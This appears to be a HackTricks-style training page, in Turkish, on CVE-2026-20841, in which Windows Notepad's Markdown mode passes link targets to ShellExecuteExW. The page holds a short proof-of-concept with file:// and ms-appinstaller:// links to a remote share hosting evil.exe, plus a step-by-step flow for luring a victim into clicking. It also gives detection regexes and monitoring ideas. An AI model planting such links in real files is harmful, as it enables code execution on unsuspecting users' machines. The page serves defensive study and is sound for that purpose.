# Windows Protocol Handler / ShellExecute Abuse (Markdown Renderers)

{{#include ../banners/hacktricks-training.md}}

Modern Windows uygulamaları, Markdown/HTML render ederken sıklıkla kullanıcı tarafından sağlanan linkleri tıklanabilir öğelere dönüştürür ve bunları `ShellExecuteExW`'ye verir. Sıkı bir scheme allowlisting uygulanmadığında, kayıtlı herhangi bir protocol handler (ör. `file:`, `ms-appinstaller:`) tetiklenebilir ve bu da mevcut kullanıcı bağlamında kod çalıştırılmasına yol açar.

## ShellExecuteExW yüzeyi — Windows Notepad Markdown modu
- Notepad, sabit bir string karşılaştırması (`sub_1400ED5D0()`) ile Markdown modunu **sadece `.md` uzantıları için** seçer.
- Desteklenen Markdown linkleri:
- Standard: `[text](target)`
- Autolink: `<target>` (render edildiğinde `[target](target)` olur), bu yüzden her iki sözdizimi de payloads ve detections için önemlidir.
- Link tıklamaları `sub_140170F60()` içinde işlenir; burada zayıf filtreleme yapılır ve ardından `ShellExecuteExW` çağrılır.
- `ShellExecuteExW` yalnızca HTTP(S) değil, **yapılandırılmış herhangi bir protocol handler**'a yönlendirir.

### Payload considerations
- Linkteki herhangi bir `\\` dizisi, `ShellExecuteExW` çağrılmadan önce **`\\` dizileri `\` olarak normalize edilir**, bu UNC/path oluşturma ve tespiti etkiler.
- `.md` dosyaları varsayılan olarak Notepad ile **ilişkili değildir**; kurban yine de dosyayı Notepad'te açmalı ve linke tıklamalıdır, ancak render edildikten sonra link tıklanabilir hale gelir.
- Tehlikeli örnek şemalar:
- `file://` yerel/UNC payload başlatmak için.
- `ms-appinstaller://` App Installer akışlarını tetiklemek için. Diğer yerel olarak kayıtlı şemalar da kötüye kullanılabilir.

### Minimal PoC Markdown
```markdown
[run](file://\\192.0.2.10\\share\\evil.exe)
<ms-appinstaller://\\192.0.2.10\\share\\pkg.appinstaller>
```
### İstismar akışı
1. Notepad'in Markdown olarak render etmesi için bir **`.md` dosyası** oluştur.
2. Tehlikeli bir URI şeması kullanarak bir bağlantı göm (`file:`, `ms-appinstaller:`, veya yüklü herhangi bir handler).
3. Dosyayı (HTTP/HTTPS/FTP/IMAP/NFS/POP3/SMTP/SMB veya benzeri) teslim et ve kullanıcıyı bunu Notepad'de açmaya ikna et.
4. Tıklama üzerine, **normalized link** `ShellExecuteExW`'e verilir ve ilgili protocol handler, referans verilen içeriği kullanıcının bağlamında çalıştırır.

## Tespit fikirleri
- Belgeleri yaygın olarak teslim eden port/protokoller üzerinden `.md` dosyalarının transferlerini izle: `20/21 (FTP)`, `80 (HTTP)`, `443 (HTTPS)`, `110 (POP3)`, `143 (IMAP)`, `25/587 (SMTP)`, `139/445 (SMB/CIFS)`, `2049 (NFS)`, `111 (portmap)`.
- Markdown bağlantılarını (standard and autolink) ayrıştır ve **büyük/küçük harf duyarsız** `file:` veya `ms-appinstaller:` araması yap.
- Vendor tarafından önerilen regex'ler uzak kaynak erişimini yakalamak için:
```
(\x3C|\[[^\x5d]+\]\()file:(\x2f|\x5c\x5c){4}
(\x3C|\[[^\x5d]+\]\()ms-appinstaller:(\x2f|\x5c\x5c){2}
```
- Yamanın davranışı bildirildiğine göre **allowlists local files and HTTP(S)**; `ShellExecuteExW`'e ulaşan diğer her şey şüphelidir. Tespitleri gerektiğinde kurulu diğer protocol handlers için genişletin, çünkü attack surface sistemler arasında değişir.

## Referanslar
- [CVE-2026-20841: Arbitrary Code Execution in the Windows Notepad](https://www.thezdi.com/blog/2026/2/19/cve-2026-20841-arbitrary-code-execution-in-the-windows-notepad)
- [CVE-2026-20841 PoC](https://github.com/BTtea/CVE-2026-20841-PoC)

{{#include ../banners/hacktricks-training.md}}
